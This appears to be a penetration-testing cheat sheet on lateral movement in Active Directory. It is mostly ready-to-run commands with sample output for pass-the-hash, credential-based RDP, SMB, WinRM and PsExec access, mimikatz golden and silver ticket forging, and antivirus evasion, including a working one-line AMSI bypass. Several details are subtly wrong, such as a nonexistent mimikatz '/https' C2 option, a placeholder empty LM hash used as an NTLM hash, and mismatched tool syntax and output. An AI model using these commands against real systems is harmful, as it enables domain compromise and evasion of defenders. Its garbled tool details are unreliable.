# Lateral Movement in Active Directory Penetration Testing

## Overview

Lateral movement involves using compromised credentials or access to move between systems in the AD environment, targeting high-value assets like domain controllers or critical servers.

## Detailed Methods and Techniques

- **Pass-the-Hash**:
  - **Technique**: Use stolen NTLM hashes to authenticate to other systems.
  - **Execution**: Use `psexec.py` from Impacket.

    ```bash
    psexec.py example.com/jdoe@192.168.1.20 -hashes :aad3b435b51404eeaad3b435b51404ee
    ```

    **Example Output**:

    ```
    [*] Connected to 192.168.1.20 as jdoe
    ```
    - **Purpose**: Access another system using stolen credentials.
- **Remote Desktop Access**:
  - **Technique**: Use compromised credentials to log into systems via RDP.
  - **Execution**: Use `xfreerdp`.

    ```bash
    xfreerdp /u:jdoe /p:P@ssw0rd123 /v:192.168.1.20
    ```

    **Example Output**: RDP session opens to the target system.
    - **Purpose**: Gain interactive access to a server or workstation.
- **SMB Share Access**:
  - **Technique**: Access shared folders to extract data or deploy payloads.
  - **Execution**: Use `smbclient.py` from Impacket.

    ```bash
    smbclient.py example.com/jdoe:P@ssw0rd123@192.168.1.20
    ```

    **Example Output**:

    ```
    smb: \> dir
    shared_folder  D  0  Mon Jul  7 10:00:00 2025
    ```
    - **Purpose**: Extract sensitive data from accessible shares.
- **WinRM Access**:
  - **Technique**: Use WinRM for remote command execution.
  - **Execution**: Use `evil-winrm`.

    ```bash
    evil-winrm -i 192.168.1.20 -u jdoe -p P@ssw0rd123
    ```

    **Example Output**:

    ```
    *Evil-WinRM* PS C:\Users\jdoe>
    ```
    - **Purpose**: Execute commands on remote systems.
- **PsExec with Credentials**:
  - **Technique**: Use valid credentials to execute commands via PsExec.
  - **Execution**: Use `psexec`.

    ```bash
    psexec \\192.168.1.20 -u example.com\jdoe -p P@ssw0rd123 cmd
    ```

    **Example Output**:

    ```
    PsExec v2.34 - Execute processes remotely
    cmd.exe started on 192.168.1.20
    ```
    - **Purpose**: Gain a shell on a remote system.

## Exploitation Methods

- **Overpass-the-Hash**:
  - **Technique**: Convert an NTLM hash to a Kerberos ticket for lateral movement.
  - **Execution**: Use `mimikatz` to generate a Kerberos ticket.

    ```bash
    mimikatz # sekurlsa::pth /user:jdoe /domain:example.com /ntlm:aad3b435b51404eeaad3b435b51404ee
    ```

    **Example Output**:

    ```
    [*] TGT created for jdoe@EXAMPLE.COM
    ```
    - Use the ticket with `psexec.py` to access another system.
    - **Purpose**: Authenticate to systems without the password.
- **Golden Ticket Attack**:
  - **Technique**: Create a forged Kerberos TGT using the `krbtgt` account hash.
  - **Execution**: Use `mimikatz`.

    ```bash
    mimikatz # kerberos::golden /user:Administrator /domain:example.com /sid:S-1-5-21-1234567890-0987654321-123456789 /krbtgt:aad3b435b51404eeaad3b435b51404ee
    ```

    **Example Output**:

    ```
    [*] Golden ticket created
    ```
    - Use the ticket to access any system in the domain.
    - **Purpose**: Gain persistent Domain Admin access.
- **Silver Ticket Attack**:
  - **Technique**: Forge a TGS ticket for a specific service.
  - **Execution**: Use `mimikatz`.

    ```bash
    mimikatz # kerberos::golden /user:jdoe /domain:example.com /sid:S-1-5-21-1234567890-0987654321-123456789 /target:sql01.example.com /service:cifs /rc4:aad3b435b51404eeaad3b435b51404ee
    ```

    **Example Output**:

    ```
    [*] Silver ticket created
    ```

## AV/AMSI Evasion Techniques

- **Obfuscated Payloads**:
  - **Technique**: Obfuscate PowerShell scripts for lateral movement.
  - **Execution**: Use `Invoke-Obfuscation`.

    ```powershell
    Invoke-Obfuscation -ScriptBlock {Invoke-Command -ComputerName 192.168.1.20 -ScriptBlock {whoami}} -Technique Encode
    ```

    **Example Output**:

    ```
    $encoded = "JAB...=="
    Invoke-Expression ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($encoded)))
    ```
    - **Purpose**: Evade AMSI detection during remote execution.
- **In-Memory Execution**:
  - **Technique**: Execute commands in memory.
  - **Execution**: Use `evil-winrm` with in-memory scripts.

    ```bash
    evil-winrm -i 192.168.1.20 -u jdoe -p P@ssw0rd123 -s payload.ps1
    ```
    - **Purpose**: Avoid AV detection by not writing to disk.
- **AMSI Bypass**:
  - **Technique**: Disable AMSI via memory patching.
  - **Execution**:

    ```powershell
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext','NonPublic,Static').SetValue($null, [IntPtr]::Zero)
    ```
    - **Purpose**: Prevent PowerShell script scanning.
- **Encrypted C2 Channels**:
  - **Technique**: Use HTTPS for C2 communication.
  - **Execution**: Configure `mimikatz` with HTTPS.

    ```bash
    mimikatz # sekurlsa::pth /user:jdoe /domain:example.com /ntlm:aad3b435b51404eeaad3b435b51404ee /https
    ```
    - **Purpose**: Evade network-based AV/EDR monitoring.

## Tools

- **Impacket**: Pass-the-hash and SMB access (`psexec.py`, `smbclient.py`).
- **Mimikatz**: Kerberos ticket attacks (`sekurlsa::pth`, `kerberos::golden`).
- **xfreerdp**: RDP access (`xfreerdp /u:user /p:pass /v:target`).
- **evil-winrm**: WinRM access.
- **PsExec**: Remote command execution.

## Best Practices

- Minimize lateral movement attempts to avoid detection by EDR systems.
- Document all accessed systems and methods for reporting.
- Use encrypted connections for sensitive operations.
- Verify permission for lateral movement to avoid unintended impact.